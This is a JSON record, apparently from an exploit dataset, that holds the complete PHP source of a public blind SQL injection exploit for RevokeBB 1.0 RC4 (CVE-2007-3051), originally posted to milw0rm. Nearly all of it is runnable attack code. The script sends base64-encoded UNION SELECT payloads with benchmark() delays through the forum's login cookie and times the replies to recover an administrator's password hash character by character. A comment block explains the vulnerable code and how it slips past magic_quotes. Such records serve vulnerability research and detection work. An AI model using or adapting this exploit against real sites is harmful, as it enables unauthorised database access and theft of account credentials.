{
  "id": "4020",
  "title": "RevokeBB 1.0 RC4 - Blind SQL Injection / Hash Retrieve",
  "cve": "CVE-2007-3051",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/php -q -d short_open_tag=on\r\n<?\r\necho \"\r\n-------------------------------------------------------------\r\nRevokeBB <= 1.0 RC4 Blind SQL Injection / Hash Retrieve Exploit\r\n\r\nSite: http://www.revokesoft.net\r\n\r\nby BlackHawk <hawkgotyou@gmail.com> <http://itablackhawk.altervista.org>\r\nThanks to rgod for the php code and Marty for the Love\r\n\r\n-------------------------------------------------------------\r\n\";\r\nif ($argc<5) {\r\necho \"\r\nUsage: php \".$argv[0].\" Host Path UserName PrefiX\r\nHost:          target server (ip/hostname)\r\nPath:          path of revbb\r\nUserName:      a valid username\r\nPrefiX:        the table prefix (usually revokebb_)\r\n\r\nExample:\r\nphp \".$argv[0].\" localhost /revbb/ admin revokebb_\r\n\";\r\ndie;\r\n}\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\",5);\r\n\r\nfunction quick_dump($string)\r\n{\r\n  $result='';$exa='';$cont=0;\r\n  for ($i=0; $i<=strlen($string)-1; $i++)\r\n  {\r\n   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))\r\n   {$result.=\"  .\";}\r\n   else\r\n   {$result.=\"  \".$string[$i];}\r\n   if (strlen(dechex(ord($string[$i])))==2)\r\n   {$exa.=\" \".dechex(ord($string[$i]));}\r\n   else\r\n   {$exa.=\" 0\".dechex(ord($string[$i]));}\r\n   $cont++;if ($cont==15) {$cont=0; $result.=\"\\r\\n\"; $exa.=\"\\r\\n\";}\r\n  }\r\n return $exa.\"\\r\\n\".$result;\r\n}\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\nfunction sendpacketii($packet)\r\n{\r\n  global $proxy, $host, $port, $html, $proxy_regex;\r\n  if ($proxy=='') {\r\n    $ock=fsockopen(gethostbyname($host),$port);\r\n    if (!$ock) {\r\n      echo 'No response from '.$host.':'.$port; die;\r\n    }\r\n  }\r\n  else {\r\n\t$c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {\r\n      echo 'Not a valid proxy...';die;\r\n    }\r\n    $parts=explode(':',$proxy);\r\n    echo \"Connecting to \".$parts[0].\":\".$parts[1].\" proxy...\\r\\n\";\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      echo 'No response from proxy...';die;\r\n\t}\r\n  }\r\n  fputs($ock,$packet);\r\n  if ($proxy=='') {\r\n    $html='';\r\n    while (!feof($ock)) {\r\n      $html.=fgets($ock);\r\n    }\r\n  }\r\n  else {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\n  fclose($ock);\r\n}\r\n/*\r\n\r\nVuln Explanation:\r\n\r\nThis board is very cool, and before founding this bug I was sure to use it for my forum..\r\n\r\nVulnerable code can be found at inc\\class_users.php, line 94:\r\n\r\nif(!$_SESSION['auth'] && isset($_COOKIE['revokebb_user']))\r\n{\r\n\t$temp_name = explode('%%',$_COOKIE['revokebb_user']);\r\n\t$temp_name[0] = base64_decode($temp_name[0]); <--- 1\r\n\t$query = $this->db->execQuery( $this->db->sql_build('cookie_user_exists', array($temp_name[0], $temp_name[1] ) ));\r\n\tif($this->db->num_rows($query)==1)\r\n\t{\r\n\t\t$temp=$this->db->fetch_array($query);\r\n\t\t$this->login($temp_name[0], $temp_name[1], $sid, false, 0);  <--- 2\r\n\t}\r\n\telse\r\n\t\tsetcookie('revokebb_user', '', time() - 3600);\r\n}\r\n\r\nWith base64_decode we can easy bypass magic_quotes, and inject a very pretty username into the SQL statement,\r\nbut unfotunatly, because of point 2 we could not complete bypass the login, this is the code:\r\n\r\n$username = htmlspecialchars($username, ENT_QUOTES);\r\n$password = htmlspecialchars($password, ENT_QUOTES);\r\n\r\nso what we could do is only a blind sql injection to bruteforce the hash of the admin..\r\n\r\n---------------\r\n| ATTENTION!! |\r\n---------------\r\n\r\nin the various version the cookie name change, so edit it when doing the attack..\r\n\r\nI must name my \"friend\" SpiderZ on this exploit, because his advisory with an EXTREMLY\r\nCRITICAL XSS in this board is the reason why I have analized this software to show him\r\nwhat a vuln is..\r\n*/\r\n$host=$argv[1];\r\n$path=$argv[2];\r\n$uname=$argv[3];\r\n$prefix=$argv[4];\r\n\r\n$port=80;\r\n$proxy=\"\";\r\n\r\nif (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}\r\nif ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}\r\n\r\n$md5s[0]=0;//null\r\n$md5s=array_merge($md5s,range(48,57)); //numbers\r\n$md5s=array_merge($md5s,range(97,102));//a-f letters\r\n#print_r(array_values($md5s));\r\n\r\n$j=1;$password=\"\";\r\nwhile (!strstr($password,chr(0)))\r\n{\r\nfor ($i=0; $i<=255; $i++)\r\n{\r\nif (in_array($i,$md5s))\r\n{\r\n  $starttime=time();\r\n  $sql=base64_encode(\"69' UNION SELECT IF ((ASCII(SUBSTRING(\".$prefix.\"users.user_password,\".$j.\",1))=\".$i.\") & 1, benchmark(200000000,CHAR(0)),0),2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1 FROM \".$prefix.\"users WHERE \".$prefix.\"users.user_nick = '$uname'/*\");\r\n  $packet =\"GET \".$p.\"index.php HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Cookie: rv_user=$sql%%hawk\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nsendpacketii($packet);\r\nif (eregi(\"The used SELECT statements have a different number of columns\",$html)){echo $html; die(\"\\nunknown query error...\");}\r\n  $endtime=time();\r\n  echo \"endtime -> \".$endtime.\"\\r\\n\";\r\n  $difftime=$endtime - $starttime;\r\n  echo \"difftime -> \".$difftime.\"\\r\\n\";\r\n  if ($difftime > 7) {$password.=chr($i);echo \"password -> \".$password.\"[???]\\r\\n\";sleep(2);break;}\r\n}\r\n  if ($i==255) {die(\"Exploit failed...\");}\r\n  }\r\n  $j++;\r\n}\r\necho \"\r\n\r\n$uname Hash is:  $password\";\r\n\r\n# Coded With BH Fast Generator v0.1\r\n?>\r\n\r\n# milw0rm.com [2007-06-01]",
  "url": "https://www.exploit-db.com/exploits/4020"
}